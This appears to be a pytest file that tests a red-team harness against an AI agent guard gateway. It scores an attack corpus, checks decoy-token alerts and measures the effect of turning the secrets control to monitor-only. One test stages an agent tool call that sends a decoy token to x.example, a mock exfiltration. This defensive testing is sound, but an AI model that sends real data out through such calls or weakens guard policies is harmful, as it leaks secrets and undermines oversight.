"""End to end against the real Shpont-Shield control layer, in-process (no server needed).

Skipped when the control layer is not importable. Point SHIELD_PATH at a checkout of
Shpont-Shield, or keep it next to this repository.
"""

from __future__ import annotations

import json
import os
import sys
from pathlib import Path

import pytest
import yaml

SHIELD = Path(os.environ.get("SHIELD_PATH", Path(__file__).parent.parent.parent / "Shpont-Shield"))
if (SHIELD / "controllayer").is_dir():
    sys.path.insert(0, str(SHIELD))
controllayer_app = pytest.importorskip("controllayer.gateway.app", reason="Shpont-Shield not found")

from fastapi.testclient import TestClient  # noqa: E402

from shield_redteam.config import load  # noqa: E402
from shield_redteam.core.target import GatewayTarget  # noqa: E402
from shield_redteam.core.types import Case  # noqa: E402
from shield_redteam.poligon import corpus  # noqa: E402
from shield_redteam.poligon.runner import run  # noqa: E402
from shield_redteam.poligon.score import impact, report  # noqa: E402
from shield_redteam.tripwire.alerts import AlertStore  # noqa: E402
from shield_redteam.tripwire.drills import drill_cases  # noqa: E402
from shield_redteam.tripwire.feed import build_feed  # noqa: E402
from shield_redteam.tripwire.plant import patch_policy  # noqa: E402
from shield_redteam.tripwire.registry import Registry  # noqa: E402

ROOT = Path(__file__).parent.parent
pytestmark = pytest.mark.shield


@pytest.fixture
def shield(tmp_path, monkeypatch):
    """A real control layer running the shipped policy with our decoys planted."""
    monkeypatch.setenv("ACL_SEMANTIC", "heuristic")
    monkeypatch.setenv("ACL_UPSTREAM", "mock")
    cfg = load(ROOT / "redteam.yaml")
    registry = Registry.from_config(cfg.tripwire)
    base = json.loads((SHIELD / "feeds" / "signatures.json").read_text())
    (tmp_path / "feed.json").write_text(json.dumps(build_feed(base, registry)))
    policy = yaml.safe_load((SHIELD / "policy.yaml").read_text())
    patched, _ = patch_policy(policy, registry, cfg.tripwire["decoys"], "feed.json")
    policy_path = tmp_path / "policy.yaml"
    policy_path.write_text(yaml.safe_dump(patched, sort_keys=False))
    client = TestClient(controllayer_app.create_app(policy_path, watch=False))
    target = GatewayTarget("http://shield", "demo-admin-token")
    target.http = client
    client.headers["x-admin-token"] = "demo-admin-token"
    return target, registry, policy_path, client


def test_control_layer_enforces_every_decoy_from_our_feed(shield):
    target, registry, _, _ = shield
    rep = report(run(target, drill_cases(registry), workers=1))
    assert rep["errors"] == 0
    assert rep["attacks"]["stopped"] == rep["attacks"]["total"] == 3 * len(registry.decoys)


def test_marker_passes_when_read_and_trips_when_it_leaves(shield):
    target, registry, _, _ = shield
    ghost = registry.get("ghost-customer").value
    read = Case("read", "benign", "tripwire", json.dumps([{"name": ghost}]), direction="tool_result", principal="bob")
    leave = Case("leave", "attack", "tripwire", json.dumps({"body": ghost}), direction="tool_call", principal="alice")
    out = run(target, [read, leave], workers=1).by_id()
    assert not out["read"].decision.stopped
    assert out["leave"].decision.action == "block"
    assert "signatures/tripwire" in out["leave"].caught_by


def test_shipped_corpus_scores_and_weakening_the_policy_shows_up(shield):
    target, _, policy_path, client = shield
    cases = corpus.load_dir(ROOT / "corpus")
    before = run(target, cases, workers=1)
    rep = report(before)
    assert rep["errors"] == 0
    assert rep["protection"] >= 0.85, rep["open_attacks"]
    assert rep["friction"] <= 0.15, rep["false_positives"]

    policy = yaml.safe_load(policy_path.read_text())
    policy["secrets"]["mode"] = "log"  # a judge turns a control into monitor-only
    policy_path.write_text(yaml.safe_dump(policy, sort_keys=False))
    assert client.post("/admin/policy/reload").json()["ok"]

    after = run(target, cases, workers=1)
    delta = impact(before, after)
    assert delta["cause"] and "policy" in delta["cause"]
    assert delta["opened"] and all(o["category"] == "secrets" for o in delta["opened"])
    assert delta["posture_after"] < delta["posture_before"]


def test_real_use_of_a_decoy_becomes_an_attributed_alert(shield):
    target, registry, _, client = shield
    token = registry.get("ghost-project").value
    r = client.post(
        "/v1/guard",
        headers={"x-api-key": "ops-agent-key"},
        json={
            "direction": "tool_call",
            "tool": "http_get",
            "text": json.dumps({"url": "https://x.example", "q": token}),
        },
    )
    assert r.json()["action"] == "block"
    store = AlertStore(registry)
    alerts = store.ingest(target.events(500))
    assert [(a["principal"], a["decoy"], a["drill"]) for a in alerts] == [("ops-agent", "ghost-project", False)]


def test_preview_shows_the_effect_of_a_change_without_touching_the_policy(shield, tmp_path):
    from shield_redteam.whatif.preview import preview

    _, registry, policy_path, _ = shield
    before = policy_path.read_text()
    feed = build_feed(json.loads((SHIELD / "feeds" / "signatures.json").read_text()), registry)
    cases = corpus.load_dir(ROOT / "corpus")
    events = [
        {
            "request_id": "r1",
            "principal": "alice",
            "direction": "input",
            "channel": "sdk",
            "text": "my key is AKIAIOSFODNN7EXAMPLE",
        }
    ]
    r = preview(SHIELD, policy_path, feed, cases, events, changes=[{"control": "secrets", "enabled": False}])
    assert policy_path.read_text() == before
    assert r["after"]["posture"] < r["before"]["posture"]
    assert r["impact"]["opened"] and all(o["category"] == "secrets" for o in r["impact"]["opened"])
    assert [f["principal"] for f in r["traffic"]["newly_allowed"]] == ["alice"]


def test_a_proposed_patch_is_proven_in_the_sandbox(shield):
    from shield_redteam.autopatch.propose import candidate
    from shield_redteam.whatif.preview import preview

    _, registry, policy_path, _ = shield
    feed = build_feed(json.loads((SHIELD / "feeds" / "signatures.json").read_text()), registry)
    cases = corpus.load_dir(ROOT / "corpus")
    target_case = next(c for c in cases if c.id == "pi-polish")
    sig = candidate(target_case, [c for c in cases if not c.must_stop])
    r = preview(SHIELD, policy_path, feed, cases, [], extra_signatures=[sig])
    assert "pi-polish" in [o["id"] for o in r["impact"]["closed"]]
    assert not r["impact"]["new_false_positives"]
